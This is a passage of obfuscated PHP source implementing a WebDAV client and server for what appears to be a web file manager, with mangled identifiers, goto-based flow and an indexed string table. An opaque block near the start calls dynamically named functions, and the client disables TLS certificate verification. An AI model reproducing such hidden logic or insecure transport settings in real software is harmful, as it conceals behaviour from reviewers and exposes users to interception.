(count($B®ÑÅÃ²ì[$fˆ…ˆ…ì¢¾]) > 1) { $A¶»ƒĞ¼¤æ[$B…Ì”óÊ­ù[543]] = !0; } goto Cç÷ÑÒÆ¦º; CÚÔòÕ”¾„: $A¶»ƒĞ¼¤æ[$B…Ì”óÊ­ù[163]] = $fˆ…ˆ…ì¢¾; Hook::trigger($B…Ì”óÊ­ù[545], $A¶»ƒĞ¼¤æ); $B®ÑÅÃ²ì[$fˆ…ˆ…ì¢¾][] =& $A¶»ƒĞ¼¤æ; goto cƒê»¾†‹; Cç÷ÑÒÆ¦º: } unset($A¶»ƒĞ¼¤æ); $c¨ÍÚÌëĞ = array($B…Ì”óÊ­ù[163] => array($B…Ì”óÊ­ù[7], array_keys($B®ÑÅÃ²ì))); goto bß²ëƒ¼; c¡§£‹ˆ: $FÕ­Öå÷­È->addAll($aò†ºÈ¦ì); $c¨ÍÚÌëĞ = array($B…Ì”óÊ­ù[163] => array($B…Ì”óÊ­ù[7], array_keys($B®ÑÅÃ²ì))); $c‰“Æ‰ºòÚ = $FÕ­Öå÷­È->where($c¨ÍÚÌëĞ)->select(); goto A¨¶óÀ†œ; d¢¡ôßëŸÜ: foreach ($bÖìì›Ã¾ as $c¹Ù¢ßô°) { $a‰ÆÄãÃÖ—[$c¹Ù¢ßô°[$B…Ì”óÊ­ù[28]]] = $c¹Ù¢ßô°; } return $a‰ÆÄãÃÖ—; goto BÊ­á­’ğç; c–éêßôİ: $B…Ì”óÊ­ù =& $_SERVER[Å¸ş]; if (!$bÖìì›Ã¾ || count($bÖìì›Ã¾) == 0) { return array(); } $B®ÑÅÃ²ì = array(); goto eÕ”¼ÑÛ¬’; bß²ëƒ¼: $FÕ­Öå÷­È = Model($B…Ì”óÊ­ù[546]); $c‰“Æ‰ºòÚ = $FÕ­Öå÷­È->where($c¨ÍÚÌëĞ)->select(); $c‰“Æ‰ºòÚ = $c‰“Æ‰ºòÚ ? $c‰“Æ‰ºòÚ : array(); goto F¿…Ø“‹È; A¨¶óÀ†œ: $c‰“Æ‰ºòÚ = $c‰“Æ‰ºòÚ ? $c‰“Æ‰ºòÚ : array(); foreach ($c‰“Æ‰ºòÚ as $Fá…°ª÷ç) { if (!isset($B®ÑÅÃ²ì[$Fá…°ª÷ç[$B…Ì”óÊ­ù[163]]])) { continue; } $fÊõ‹Ÿâ¿ =& $B®ÑÅÃ²ì[$Fá…°ª÷ç[$B…Ì”óÊ­ù[163]]]; foreach ($fÊõ‹Ÿâ¿ as &$A¶»ƒĞ¼¤æ) { $A¶»ƒĞ¼¤æ[$B…Ì”óÊ­ù[419]] = $Fá…°ª÷ç[$B…Ì”óÊ­ù[419]]; } unset($A¶»ƒĞ¼¤æ); } $a‰ÆÄãÃÖ— = array(); goto d¢¡ôßëŸÜ; F¿…Ø“‹È: foreach ($c‰“Æ‰ºòÚ as $Fá…°ª÷ç) { if (!isset($B®ÑÅÃ²ì[$Fá…°ª÷ç[$B…Ì”óÊ­ù[163]]])) { continue; } $Cå¢ÅÙ×¯ = $B®ÑÅÃ²ì[$Fá…°ª÷ç[$B…Ì”óÊ­ù[163]]]; foreach ($Cå¢ÅÙ×¯ as &$A¶»ƒĞ¼¤æ) { $A¶»ƒĞ¼¤æ[$B…Ì”óÊ­ù[419]] = $Fá…°ª÷ç[$B…Ì”óÊ­ù[419]]; $A¶»ƒĞ¼¤æ[$B…Ì”óÊ­ù[543]] = !0; } unset($A¶»ƒĞ¼¤æ); } $aò†ºÈ¦ì = array(); foreach ($bÖìì›Ã¾ as $EØÍÄáéÁß) { if (isset($EØÍÄáéÁß[$B…Ì”óÊ­ù[543]]) && $EØÍÄáéÁß[$B…Ì”óÊ­ù[543]]) { continue; } $fÉœºÄ¦¾ = $AÅÇâ¡’›->getPathInner($EØÍÄáéÁß[$B…Ì”óÊ­ù[75]]); $A±¦‘Äˆù = $FÕ­Öå÷­È->addFileMake($fÉœºÄ¦¾, $EØÍÄáéÁß[$B…Ì”óÊ­ù[77]], $EØÍÄáéÁß[$B…Ì”óÊ­ù[164]], $EØÍÄáéÁß[$B…Ì”óÊ­ù[163]], $EØÍÄáéÁß[$B…Ì”óÊ­ù[28]], $DĞùÃ¬ŞÏ§); $aò†ºÈ¦ì[] = $A±¦‘Äˆù; } goto c¡§£‹ˆ; BÊ­á­’ğç: } } define($_SERVER[Å¸ş][547], $_SERVER[Å¸ş][548]); goto DÌ©‚Ø°–¢; fİŞ àì: if ($_SERVER[$_SERVER[Å¸ş][557]] != $_SERVER[$_SERVER[Å¸ş][1769]]) { goto B†ëÎÔÇ; a¹»©éÄµå: $B›ÎòÂºôæ = explode($_SERVER[Å¸ş][217], $BÌì²¡”Û); if (count($B›ÎòÂºôæ) < $_SERVER[Å¸ş][561]) { $DóŸ«à¾‚‘ = $_SERVER[Å¸ş][562]; $DóŸ«à¾‚‘(); } $bÒ¤¥¥•™ë = $_SERVER[Å¸ş][563]; goto c´™‹ÄçÔ; c´™‹ÄçÔ: $bÒ¤¥¥•™ë($_SERVER[$_SERVER[Å¸ş][790]]); goto b õÛÃèôÂ; B†ëÎÔÇ: $cÕ¤Ñ‡Ê«‚ = $_SERVER[Å¸ş][558]; $b¶Ü·½ø„Í = $_SERVER[$_SERVER[Å¸ş][559]] . $_SERVER[Å¸ş][560]; $BÌì²¡”Û = $cÕ¤Ñ‡Ê«‚($b¶Ü·½ø„Í); goto a¹»©éÄµå; b õÛÃèôÂ: } class HttpDavClient { public function __construct($Bå†·ŠÂò¾, $fäÊËóæ¸‚, $DôÙ°Ó¯æ) { $this->header = array(); $this->userName = $fäÊËóæ¸‚; $this->userPassowrd = $DôÙ°Ó¯æ; } protected function makePath($bƒùÒÅö¤Æ) { return $bƒùÒÅö¤Æ; } protected function setHeader($D¸Üà¥È·®, $a­ŞƒÊñÇ = false) { if ($a­ŞƒÊñÇ === !1) { $this->header[] = $D¸Üà¥È·®; } else { $this->header[] = $D¸Üà¥È·® . $_SERVER[Å¸ş][877] . $a­ŞƒÊñÇ; } } public function move($aˆˆ¾ŒÇß, $E‡ÏæªóÅ, $f„Í´Ö½„Š = '') { $b¬¡øí±Á =& $_SERVER[Å¸ş]; $this->setHeader($b¬¡øí±Á[1770], $this->makePath($E‡ÏæªóÅ)); $this->setHeader($b¬¡øí±Á[1771], $b¬¡øí±Á[1772]); if ($f„Í´Ö½„Š) { $this->setHeader($b¬¡øí±Á[1773], $b¬¡øí±Á[922] . $f„Í´Ö½„Š . $b¬¡øí±Á[925]); } return $this->send($b¬¡øí±Á[1774], $aˆˆ¾ŒÇß); } public function copy($D¸ßƒ¥–—˜, $c¦Ø‘¤·Æ) { $e‘¹Øéñö =& $_SERVER[Å¸ş]; $this->setHeader($e‘¹Øéñö[1770], $this->makePath($c¦Ø‘¤·Æ)); $this->setHeader($e‘¹Øéñö[1771], $e‘¹Øéñö[1772]); return $this->send($e‘¹Øéñö[1775], $D¸ßƒ¥–—˜); } public function mkcol($bÚÀŒ‰ñÇ) { $D¡œ§¸­ŞŒ =& $_SERVER[Å¸ş]; $this->setHeader($D¡œ§¸­ŞŒ[1771], $D¡œ§¸­ŞŒ[1772]); return $this->send($D¡œ§¸­ŞŒ[1776], $bÚÀŒ‰ñÇ); } public function delete($CÛŞ†¤°É, $Fì›ïÇğÆ = '') { $fßÁ®ŞÛÔÕ =& $_SERVER[Å¸ş]; if ($Fì›ïÇğÆ) { $this->setHeader($fßÁ®ŞÛÔÕ[1773], $fßÁ®ŞÛÔÕ[922] . $Fì›ïÇğÆ . $fßÁ®ŞÛÔÕ[925]); } return $this->send($fßÁ®ŞÛÔÕ[1249], $CÛŞ†¤°É); } public function propfind($DšìÉ»šá¯) { $fàŞĞî µ =& $_SERVER[Å¸ş]; $this->setHeader($fàŞĞî µ[1777], $fàŞĞî µ[83]); $this->setHeader($fàŞĞî µ[1778], $fàŞĞî µ[1779]); $fø‡Âš„²Ú = $fàŞĞî µ[1780]; return $this->send($fàŞĞî µ[1781], $DšìÉ»šá¯, $fø‡Âš„²Ú); } public function options($C‚É—âŒ ¨) { return $this->send($_SERVER[Å¸ş][1782], $C‚É—âŒ ¨); } public function get($Eï¢”º”˜) { return $this->send($_SERVER[Å¸ş][216], $Eï¢”º”˜); } public function put($B†¾‘§‘˜, $E¼ßã¼÷”„, $dæœßŞø‘ˆ = '') { $FâÁåİŸ·Ÿ =& $_SERVER[Å¸ş]; if ($dæœßŞø‘ˆ) { $this->setHeader($FâÁåİŸ·Ÿ[1773], $FâÁåİŸ·Ÿ[922] . $dæœßŞø‘ˆ . $FâÁåİŸ·Ÿ[925]); } return $this->send($FâÁåİŸ·Ÿ[214], $B†¾‘§‘˜, $E¼ßã¼÷”„); } protected function send($EÁ¯”µâœ, $c”Ï¾Íãé¤, $bÃŠÈ—‘‚Õ = false, $BòöóÉô„º = false) { goto EëäŠÂ¡¿•; F‡·Ø‰Îù: $this->header = array(); return $Eõ©¦Ë«·; goto a×ÛéÍ¬ Ÿ; EëäŠÂ¡¿•: $C®‚øïŸ±Ä =& $_SERVER[Å¸ş]; $AĞ†åÍ­™ˆ = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($C®‚øïŸ±Ä[1783], $C®‚øïŸ±Ä[50]); goto dÂª½ÑšÎ; CÎáØÑ™ğ: $B’Ú±¼‹ìÂ = curl_init($c”Ï¾Íãé¤); curl_setopt($B’Ú±¼‹ìÂ, CURLOPT_CUSTOMREQUEST, $EÁ¯”µâœ); curl_setopt($B’Ú±¼‹ìÂ, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto fğ°¼¢‡; b¦‡’–«î‹: curl_setopt($B’Ú±¼‹ìÂ, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($B’Ú±¼‹ìÂ, CURLOPT_SSL_VERIFYHOST, !1); $Eõ©¦Ë«· = curl_exec($B’Ú±¼‹ìÂ); goto F‡·Ø‰Îù; fğ°¼¢‡: curl_setopt($B’Ú±¼‹ìÂ, CURLOPT_HTTPHEADER, $this->header); curl_setopt($B’Ú±¼‹ìÂ, CURLOPT_RETURNTRANSFER, !0); curl_setopt($B’Ú±¼‹ìÂ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto b¦‡’–«î‹; dÂª½ÑšÎ: $this->setHeader($AĞ†åÍ­™ˆ); if ($bÃŠÈ—‘‚Õ) { $bÃŠÈ—‘‚Õ = $C®‚øïŸ±Ä[1784] . $bÃŠÈ—‘‚Õ; } if (!request_url_safe($c”Ï¾Íãé¤)) { return !1; } goto CÎáØÑ™ğ; a×ÛéÍ¬ Ÿ: } } class HttpDavServer { public function __construct($aŒ‘ÖåƒëÔ, $c£½ÂÃã¹) { $this->root = $aŒ‘ÖåƒëÔ; $this->initPath($c£½ÂÃã¹); $this->start(); } public function initPath($D‚ÚÓ°±) { $Báº¨å×ëõ =& $_SERVER[Å¸ş]; $AªáÆñ¸ö = rtrim($_SERVER[$Báº¨å×ëõ[1387]], $Báº¨å×ëõ[8]) . $Báº¨å×ëõ[8]; $this->urlBase = substr($AªáÆñ¸ö, 0, strpos($AªáÆñ¸ö, $D‚ÚÓ°±) + 1); $this->urlBase = rtrim($this->urlBase, $Báº¨å×ëõ[8]) . $D‚ÚÓ°±; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $E÷ê†Àïã¨ =& $_SERVER[Å¸ş]; $CÆÉ®¡Çš = HttpAuth::get(); if ($CÆÉ®¡Çš[$E÷ê†Àïã¨[537]] == $E÷ê†Àïã¨[1785] && $CÆÉ®¡Çš[$E÷ê†Àïã¨[894]] == $E÷ê†Àïã¨[1786]) { return !0; } HttpAuth::error(); } public function start() { goto A’»‡Œâ“ ; A’»‡Œâ“ : $B´çÖ‡éÂ® =& $_SERVER[Å¸ş]; $this->checkUser(); $bóµ¢å¿Û = $B´çÖ‡éÂ®[144] . HttpHeader::method(); goto F¸ªÃÜ¬¹‡; bŒ×Í¯ÏË: if (!$AÅíˆÎ“…Ç) { return; } self::response($AÅíˆÎ“…Ç); goto E™ùÁŒÔ; F¸ªÃÜ¬¹‡: if (!method_exists($this, $bóµ¢å¿Û)) { pr($bóµ¢å¿Û . $B´çÖ‡éÂ®[1787]); die; } $eá¿åéµ×† = array($B´çÖ‡éÂ®[1788], $B´çÖ‡éÂ®[1789]); if (!in_array($bóµ¢å¿Û, $eá¿åéµ×†) && !$this->pathExists($this->path)) { $AÅíˆÎ“…Ç = array($B´çÖ‡éÂ®[1030] => 404); } else { $AÅíˆÎ“…Ç = $this->{$bóµ¢å¿Û}(); } goto bŒ×Í¯ÏË; E™ùÁŒÔ: } public function pathGet($Fáù¦¹Ê×• = false) { $BŒ‡½‹µÎë =& $_SERVER[Å¸ş]; $eÌíÙ—±£ = $Fáù¦¹Ê×• ? $_SERVER[$BŒ‡½‹µÎë[1790]] : $_SERVER[$BŒ‡½‹µÎë[1387]]; $eÌíÙ—±£ = KodIO::clear(rawurldecode($eÌíÙ—±£)); if (!strstr($eÌíÙ—±£, KodIO::clear($this->urlBase))) { return !1; } return substr($eÌíÙ—±£, strpos($eÌíÙ—±£, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($E…õ¯ò ‘) { return file_exists($E…õ¯ò ‘); } public function pathMkdir($fîˆÍ˜” ) { return mkdir($fîˆÍ˜” , 511, !0); } public function pathInfo($eÌ”«Ñ¨ª) { return path_info($eÌ”«Ñ¨ª); } public function pathList($cÃùù’÷“) { return path_list($cÃùù’÷“); } public function pathOut($fÀø…í“¶ê) { echo file_get_contents($fÀø…í“¶ê); } public function pathPut($eŒğêä¬Ì, $AãÆ®Í‘ó = '') { if (!$AãÆ®Í‘ó) { return file_put_contents($eŒğêä¬Ì, $_SERVER[Å¸ş][33]); } return move_path($AãÆ®Í‘ó, $eŒğêä¬Ì); } public function pathRemove($EìÜ–¸¦“) { if (is_file($EìÜ–¸¦“)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($a×ÜŒ¯Å°, $FÍÔµ»í÷) { return move_path($a×ÜŒ¯Å°, $FÍÔµ»í÷); } public function pathCopy($BºáÕ Ñ›¡, $f„Î°¸µÕâ) { return copy_dir($BºáÕ Ñ›¡, $f„Î°¸µÕâ); } public function parsePath($A½ö¼‘÷é) { return $A½ö¼‘÷é; } public function parseItem($C‚Œ°—Îéõ, $B¥ß´ĞƒÍ¶) { goto AØÇ…¿Ê©–; d‚æŠó˜Ø: $D†×£ŞåøÂ = array($E¤¢›ºŒæ[1791] => KodIO::clear($this->urlBase . $eÍ ŞñŒ), $E¤¢›ºŒæ[107] => @gmdate($E¤¢›ºŒæ[1792], $C‚Œ°—Îéõ[$E¤¢›ºŒæ[107]]), $E¤¢›ºŒæ[187] => @gmdate($E¤¢›ºŒæ[1793], $C‚Œ°—Îéõ[$E¤¢›ºŒæ[187]]), $E¤¢›ºŒæ[77] => $C‚Œ°—Îéõ[$E¤¢›ºŒæ[77]] ? $C‚Œ°—Îéõ[$E¤¢›ºŒæ[77]] : 0); return $D†×£ŞåøÂ; goto a™È­„ãÚ´; AØÇ…¿Ê©–: $E¤¢›ºŒæ =& $_SERVER[Å¸ş]; $eÍ ŞñŒ = $this->pathGet() . $E¤¢›ºŒæ[8] . $C‚Œ°—Îéõ[$E¤¢›ºŒæ[28]]; $eÍ ŞñŒ = $E¤¢›ºŒæ[8] . str_replace($E¤¢›ºŒæ[172], $E¤¢›ºŒæ[8], rawurlencode($eÍ ŞñŒ)); goto c·À…Ğ¯‘; c·À…Ğ¯‘: if ($B¥ß´ĞƒÍ¶) { $eÍ ŞñŒ = $E¤¢›ºŒæ[8] . str_replace($E¤¢›ºŒæ[172], $E¤¢›ºŒæ[8], rawurlencode($this->pathGet())); } if (!trim($C‚Œ°—Îéõ[$E¤¢›ºŒæ[107]])) { $C‚Œ°—Îéõ[$E¤¢›ºŒæ[107]] = time(); } if (!trim($C‚Œ°—Îéõ[$E¤¢›ºŒæ[187]])) { $C‚Œ°—Îéõ[$E¤¢›ºŒæ[187]] = time(); } goto d‚æŠó˜Ø; a™È­„ãÚ´: } public function parseItemXml($BÜí»À¡†, $FÚ¹´¾ÎË) { $f˜Æğîî² =& $_SERVER[Å¸ş]; $d«‚ÓÆâÍÁ = $this->parseItem($BÜí»À¡†, $FÚ¹´¾ÎË); if ($BÜí»À¡†[$f˜Æğîî²[29]] == $f˜Æğîî²[76]) { $E†·‰²íÛË = $f˜Æğîî²[1794]; $E†·‰²íÛË .= $f˜Æğîî²[1795]; } else { $EÆ¤Éßˆ“ß = $BÜí»À¡†[$f˜Æğîî²[160]] ? $BÜí»À¡†[$f˜Æğîî²[160]] : get_path_ext($BÜí»À¡†[$f˜Æğîî²[28]]); $DÍÕ¢ğö¶ = get_file_mime($EÆ¤Éßˆ“ß); $E†·‰²íÛË = $f˜Æğîî²[1796]; $E†·‰²íÛË .= "\x3c\104\x3a\147\x65\x74\143\x6f\156\164\x65\156\164\164\x79\x70\x65\76{$DÍÕ¢ğö¶}\74\57\104\x3a\x67\145\x74\x63\x6f\x6e\x74\x65\x6e\164\164\x79\x70\x65\x3e"; } return "\xa\11\x9\x3c\x44\72\x72\x65\163\160\x6f\x6e\x73\x65\x3e\12\11\11\11\x3c\104\72\150\162\145\146\76{$d«‚ÓÆâÍÁ[$f˜Æğîî²[1791]]}\x3c\x2f\104\72\x68\x72\x65\x66\76\12\x9\11\x9\74\104\72\x70\162\157\x70\163\x74\141\164\x3e\xa\11\x9\x9\11\x3c\x44\x3a\160\162\157\160\x3e\xa\11\x9\11\11\11\74\104\x3a\x67\x65\x74\x6c\141\163\164\x6d\157\x64\151\x66\x69\x65\x64\76{$d«‚ÓÆâÍÁ[$f˜Æğîî²[107]]}\74\x2f\x44\72\147\x65\x74\x6c\141\163\164\155\157\144\151\x66\151\x65\144\x3e\12\11\x9\11\x9\11\74\x44\72\x63\x72\x65\141\164\x69\x6f\156\x64\x61\x74\x65\x3e{$d«‚ÓÆâÍÁ[$f˜Æğîî²[187]]}\74\x2f\x44\72\x63\x72\x65\x61\x74\x69\x6f\156\144\141\164\145\x3e\xa\x9\11\x9\11\x9\74\104\72\147\x65\x74\x63\x6f\x6e\x74\145\156\164\154\x65\156\147\164\150\x3e{$d«‚ÓÆâÍÁ[$f˜Æğîî²[77]]}\x3c\57\x44\72\x67\x65\x74\143\157\156\x74\x65\156\164\x6c\x65\x6e\147\x74\x68\x3e\xa\x9\11\11\x9\11{$E†·‰²íÛË}\12\x9\11\x9\11\x3c\x2f\x44\x3a\160\162\x6f\x70\76\xa\11\11\11\11\x3c\104\x3a\x73\x74\x61\164\x75\163\x3e\x48\124\x54\x50\x2f\x31\x2e\x31\40\x32\60\60\40\117\113\74\57\x44\x3a\x73\164\141\164\x75\163\76\xa\x9\x9\11\74\x2f\x44\x3a\x70\x72\157\160\x73\164\x61\x74\76\xa\x9\11\x3c\57\104\72\162\x65\163\160\x6f\156\x73\145\x3e"; } public function pathListMerge($b…ÊìÌƒæ) { goto bµª‘Â½·; D¦“äÄ›ô: $AÖìØòå‹ = array(); foreach ($b…ÊìÌƒæ as $a­Õïåµ => $aóºÕà¸Îì) { if (!in_array($a­Õïåµ, $bÎ¯àøºì ) || !is_array($aóºÕà¸Îì)) { continue; } $AÖìØòå‹ = array_merge($AÖìØòå‹, $aóºÕà¸Îì); } foreach ($AÖìØòå‹ as &$f“‘ËâÌ‘) { $f“‘ËâÌ‘[$BõÇ¬¦­ù[28]] = str_replace($BõÇ¬¦­ù[8], $BõÇ¬¦­ù[1389], $f“‘ËâÌ‘[$BõÇ¬¦­ù[28]]); } goto D„ŒÇÀ¶—»; bµª‘Â½·: $BõÇ¬¦­ù =& $_SERVER[Å¸ş]; if (!$b…ÊìÌƒæ) { return $b…ÊìÌƒæ; } $bÎ¯àøºì  = array($BõÇ¬¦­ù[73], $BõÇ¬¦­ù[74], $BõÇ¬¦­ù[1797]); goto D¦“äÄ›ô; D„ŒÇÀ¶—»: unset($f“‘ËâÌ‘); return $AÖìØòå‹; goto CÅŞä»¿ì‹; CÅŞä»¿ì‹: } public function httpPROPFIND() { goto AÈÃîÊä†„; AÈÃîÊä†„: $FÓ¾ç„ĞË‹ =& $_SERVER[Å¸ş]; $c”ôíÛ·· = $this->pathList($this->path); $EÓîšÈ—ÖÄ = $this->pathListMerge($c”ôíÛ··); goto CÅ—É’È¥”; CÅ—É’È¥”: $bŒ¿òˆ§º = $c”ôíÛ··[$FÓ¾ç„ĞË‹[1798]]; if (!is_array($EÓîšÈ—ÖÄ) || $bŒ¿òˆ§º[$FÓ¾ç„ĞË‹[1799]] === !1) { return array($FÓ¾ç„ĞË‹[1800] => 404, $FÓ¾ç„ĞË‹[1801] => $FÓ¾ç„ĞË‹[1802]); } $eöÕ”ÀËÄ = $bŒ¿òˆ§º[$FÓ¾ç„ĞË‹[29]] == $FÓ¾ç„ĞË‹[167] || HttpHeader::get($FÓ¾ç„ĞË‹[1777]) == $FÓ¾ç„ĞË‹[470]; goto eœõ…¿ö¾ğ; eœõ…¿ö¾ğ: if ($eöÕ”ÀËÄ) { $EÓîšÈ—ÖÄ = array($bŒ¿òˆ§º); } else { $bŒ¿òˆ§º[$FÓ¾ç„ĞË‹[28]] = $FÓ¾ç„ĞË‹[33]; $EÓîšÈ—ÖÄ = array_merge(array($bŒ¿òˆ§º), $EÓîšÈ—ÖÄ); } $d¯‡µ˜ ò = $FÓ¾ç„ĞË‹[33]; foreach ($EÓîšÈ—ÖÄ as $c™êˆÖŒšÅ) { $d¯‡µ˜ ò .= $this->parseItemXml($c™êˆÖŒšÅ, $eöÕ”ÀËÄ); } goto FØšğ”ºˆµ; FØšğ”ºˆµ: return array($FÓ¾ç„ĞË‹[1800] => 207, $FÓ¾ç„ĞË‹[1801] => "\74\104\72\x6d\165\154\164\151\x73\164\141\164\x75\x73\x20\170\x6d\154\156\x73\x3a\x44\75\x22\x44\101\x56\x3a\42\76\12{$d¯‡µ˜ ò}\xa\x3c\x2f\x44\x3a\x6d\x75\154\x74\151\x73\164\141\x74\165\163\76"); goto AÈÌ£õâ¹ã; AÈÌ£õâ¹ã: } public function httpHEAD() { $fù‰“š¯Ö =& $_SERVER[Å¸ş]; $fŞÚ·¿§¢Ú = $this->pathInfo($this->path); if (!$fŞÚ·¿§¢Ú || $fŞÚ·¿§¢Ú[$fù‰“š¯Ö[29]] == $fù‰“š¯Ö[76]) { return array($fù‰“š¯Ö[1030] => 200, $fù‰“š¯Ö[1205] => array($fù‰“š¯Ö[1803])); } return array($fù‰“š¯Ö[1030] => 200, $fù‰“š¯Ö[1205] => array($fù‰“š¯Ö[1804], $fù‰“š¯Ö[136], $fù‰“š¯Ö[1805] . $fŞÚ·¿§¢Ú[$fù‰“š¯Ö[77]], $fù‰“š¯Ö[1806] . get_file_mime($fŞÚ·¿§¢Ú[$fù‰“š¯Ö[160]]), $fù‰“š¯Ö[132] . gmdate($fù‰“š¯Ö[1792], $fŞÚ·¿§¢Ú[$fù‰“š¯Ö[1252]]) . $fù‰“š¯Ö[1807], $fù‰“š¯Ö[1808])); } public function httpOPTIONS() { $Cò¬ŒÃˆ¡ù =& $_SERVER[Å¸ş]; return array($Cò¬ŒÃˆ¡ù[1030] => 200, $Cò¬ŒÃˆ¡ù[1205] => array($Cò¬ŒÃˆ¡ù[1809], $Cò¬ŒÃˆ¡ù[1810], $Cò¬ŒÃˆ¡ù[1811], $Cò¬ŒÃˆ¡ù[1261])); } public function httpPROPPATCH() { $fŸ…Ã¶º¤” =& $_SERVER[Å¸ş]; $FÉéæÀÀ³ = $fŸ…Ã¶º¤”[1812] . $_SERVER[$fŸ…Ã¶º¤”[1387]] . $fŸ…Ã¶º¤”[1813]; return array($fŸ…Ã¶º¤”[1800] => 207, $fŸ…Ã¶º¤”[1801] => "\x3c\104\72\155\x75\x6c\x74\x69\163\x74\141\164\165\x73\x20\170\155\154\156\163\x3a\x44\75\x22\104\101\x56\72\42\76\12{$FÉéæÀÀ³}\12\x3c\57\x44\x3a\x6d\165\154\164\x69\163\164\x61\x74\165\163\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $Aƒ§ˆŠÎï =& $_SERVER[Å¸ş]; $A¬¡¾ÖÒˆ± = $this->uploadFile(); if ($A¬¡¾ÖÒˆ±) { $Aó©ó¦Ùƒ = 204; } else { $A¬¡¾ÖÒˆ± = $Aƒ§ˆŠÎï[33]; $Aó©ó¦Ùƒ = 201; } $b‰©ßíŒ = $this->pathPut($this->path, $A¬¡¾ÖÒˆ±); if ($b‰©ßíŒ == !1) { $Aó©ó¦Ùƒ = 404; } return array($Aƒ§ˆŠÎï[1800] => $Aó©ó¦Ùƒ); } private function uploadFile() { goto dŸ¡¡ñè‚; Døš÷·•¯‰: $e•†÷£àš² = @fopen($B‚­­æ®, $fñè¬„­”[1521]); $eª­¨çõ…’ = @fopen($fñè¬„­”[1815], $fñè¬„­”[1520]); if (!$eª­¨çõ…’ || !$e•†÷£àš²) { @unlink($B‚­­æ®); return !1; } goto AÕŒøß¡”; EïŒÒ°‹×·: if (@filesize($B‚­­æ®) > 0) { return $B‚­­æ®; } @unlink($B‚­­æ®); return !1; goto E÷¡Ä‚¼×ö; AÕŒøß¡”: while (!feof($eª­¨çõ…’)) { fwrite($e•†÷£àš², fread($eª­¨çõ…’, 1024 * 200)); } fclose($eª­¨çõ…’); fclose($e•†÷£àš²); goto EïŒÒ°‹×·; dŸ¡¡ñè‚: $fñè¬„­” =& $_SERVER[Å¸ş]; @mk_dir(TEMP_FILES); $B‚­­æ® = TEMP_FILES . $fñè¬„­”[1814] . rand_string(32); goto Døš÷·•¯‰; E÷¡Ä‚¼×ö: } public function httpMKCOL() { $c®ŒŸ òÊŠ =& $_SERVER[Å¸ş]; if ($this->pathExists($this->path)) { return array($c®ŒŸ òÊŠ[1030] => 409); } $AğÌÄğØ¾… = $this->pathMkdir($this->path); return array($c®ŒŸ òÊŠ[1030] => $AğÌÄğØ¾… ? 201 : 403); } public function httpMOVE() { $BãÁ™Ú·¥  =& $_SERVER[Å¸ş]; $CÆœ»ˆ™ÌŸ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$BãÁ™Ú·¥ [1816]])) { $CÊ¬Î³Ğ‰À[$BãÁ™Ú·¥ [1817]] = $_SERVER[$BãÁ™Ú·¥ [1816]] == $BãÁ™Ú·¥ [1818]; } $CÎ ßÓâ ˆ = $this->pathMove($this->path, $CÆœ»ˆ™ÌŸ); return array($BãÁ™Ú·¥ [1030] => $CÎ ßÓâ ˆ ? 201 : 404); } public function httpCOPY() { $bä‘ÈÌÔ»Ó = $this->parsePath($this->pathGet(!0)); $DË‡„Êºƒ¬ = $this->pathCopy($this->path, $bä‘ÈÌÔ»Ó); return array($_SERVER[Å¸ş][1030] => $DË‡„Êºƒ¬ ? 201 : 404); } public function httpDELETE() { $c×ºŒöìø = $this->pathRemove($this->path); return array($_SERVER[Å¸ş][1030] => $c×ºŒöìø ? 200 : 503); } public function httpLOCK() { $f‚Õƒ£¢¨ =& $_SERVER[Å¸ş]; $c¶Š‘±˜²× = md5($this->path); $dôòŞäøŠÊ = $f‚Õƒ£¢¨[1819] . $this->xmlGet($f‚Õƒ£¢¨[1820]) . $f‚Õƒ£¢¨[1821] . $c¶Š‘±˜²× . $f‚Õƒ£¢¨[1822]; return array($f‚Õƒ£¢¨[1030] => 200, $f‚Õƒ£¢¨[1205] => array($f‚Õƒ£¢¨[1823] . $c¶Š‘±˜²×, $f‚Õƒ£¢¨[1824]), $f‚Õƒ£¢¨[1825] => $dôòŞäøŠÊ); } public function httpUNLOCK() { return array($_SERVER[Å¸ş][1030] => 204); } public function xmlGet($D¯ÖÕÙ³÷) { goto f…ˆá©÷Æâ; F¾ßŠ“šÇ: $dÎË¡´¼’ = explode($Dã¨çÓä«[8], $D¯ÖÕÙ³÷); $bæ¤ºë§‚ù = array_shift($dÎË¡´¼’); $EÖÛÙ¼ìé¦ = $a†¦ĞÃ ã•->getElementsByTagNameNS($Dã¨çÓä«[1827], $bæ¤ºë§‚ù); goto CÒ³‹¡‹È¥; f…ˆá©÷Æâ: $Dã¨çÓä« =& $_SERVER[Å¸ş]; static $a†¦ĞÃ ã• = false; if (!$a†¦ĞÃ ã•) { $e”Íì¼•Œ = file_get_contents($Dã¨çÓä«[1826]); $a†¦ĞÃ ã• = new DOMDocument(); $a†¦ĞÃ ã•->loadXML($e”Íì¼•Œ); } goto F¾ßŠ“šÇ; CÒ³‹¡‹È¥: if ($EÖÛÙ¼ìé¦) { return $EÖÛÙ¼ìé¦[0]->nodeValue; } return $Dã¨çÓä«[33]; goto e²¥±Åº÷î; e²¥±Åº÷î: } public static function response($eŞˆêÏ¾„) { goto C·¾ö‰ñ»; C·¾ö‰ñ»: $eõÔªòñªÖ =& $_SERVER[Å¸ş]; $c˜£İ¿¢– = is_array($eŞˆêÏ¾„[$eõÔªòñªÖ[1205]]) ? $eŞˆêÏ¾„[$eõÔªòñªÖ[1205]] : array(); $c˜£İ¿¢–[] = HttpHeader::code($eŞˆêÏ¾„[$eõÔªòñªÖ[1030]]); goto aËæ‰¼í”; D¯‚­©æá‘: if (is_string($eŞˆêÏ¾„[$eõÔªòñªÖ[1825]])) { header($eõÔªòñªÖ[1828]); $d¿§ª×íîï = $eõÔªòñªÖ[1829] . $eõÔªòñªÖ[217] . $eŞˆêÏ¾„[$eõÔªòñªÖ[1825]]; echo $d¿§ª×íîï; } goto aŸ‹·¦¨Ì¢; aËæ‰¼í”: $c˜£İ¿¢–[] = $eõÔªòñªÖ[1766]; $c˜£İ¿¢–[] = $eõÔªòñªÖ[1767]; foreach ($c˜£İ¿¢– as $a„¢ö³À‘) { 